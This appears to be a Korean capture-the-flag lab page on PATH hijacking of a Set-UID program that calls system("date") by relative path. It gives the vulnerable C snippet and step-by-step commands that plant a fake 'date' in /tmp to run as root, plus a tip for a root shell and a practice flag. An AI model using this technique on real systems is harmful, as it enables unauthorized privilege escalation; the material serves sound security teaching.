# [Set-UID Track] Level 2: 기본 (Basic) - `system_date`

## 1. 문제 개요
Set-UID 프로그램이 내부에서 `system()` 을 **상대경로**로 호출할 때 생기는 **PATH 하이재킹**을 체험하는 로컬 연습입니다.

> 📌 **숨겨진 플래그를 찾는 문제가 아닙니다.** '가짜 명령'을 `PATH` 로 끼워넣어 root 권한 실행을 유도하는 원리를 확인하면 완료입니다. (개념 이해용 **참여 점수**)

---

## 2. 취약점 분석
`system_date.c` 핵심:
```c
setreuid(geteuid(), geteuid());   // RUID=EUID → dash 권한강하 회피
system("date");                   // 절대경로 아님 → 셸이 PATH 를 탐색 (취약)
```
- 절대경로 `/bin/date` 가 아니라 상대명령 `date` 이므로, `PATH` 앞에 **가짜 date** 를 두면 그게 root 로 실행됩니다.

---

## 3. 실습 방법 (★ 본인 호스트, sudo 필요 · 위→아래로 그대로 실행)
```bash
# 1) 빌드 + Set-UID 설정
make
sudo chown root:root system_date && sudo chmod 4755 system_date
ls -l system_date                 # -rwsr-xr-x (s 비트) 확인

# 2) 가짜 date 준비 ( id 를 출력해 권한 확인 )
mkdir -p /tmp/pwn
printf '#!/bin/sh\nid\n' > /tmp/pwn/date
chmod +x /tmp/pwn/date

# 3) PATH 앞에 끼우고 실행
export PATH=/tmp/pwn:$PATH
./system_date
# → uid=0(root) 가 출력되면 성공! (진짜 date 대신 가짜가 root 로 실행됨)
```

### 완료 기준
가짜 `date` 의 `id` 출력에 **uid=0(root)** 이 보이면 PATH 하이재킹 성공입니다.
루트 셸을 직접 얻고 싶으면 2)의 `id` 를 `/bin/sh` 로 바꿔 실행하세요.

---

## ⚠️ 주의 (채점 무결성)
본 레벨은 **로컬 참여 점수**입니다. 이 기법을 채점 컨테이너의 실점수 플래그에 사용하는 것은 의도된 풀이가 아닙니다. Level 3(`secure_logger`)의 Main 플래그는 컨테이너에서 직접 익스플로잇해야 유효합니다.

---

## 4. 연습 플래그
`FLAG{setuid_basic_practice}`  (정적 연습용 — 서버 채점 대상 아님)
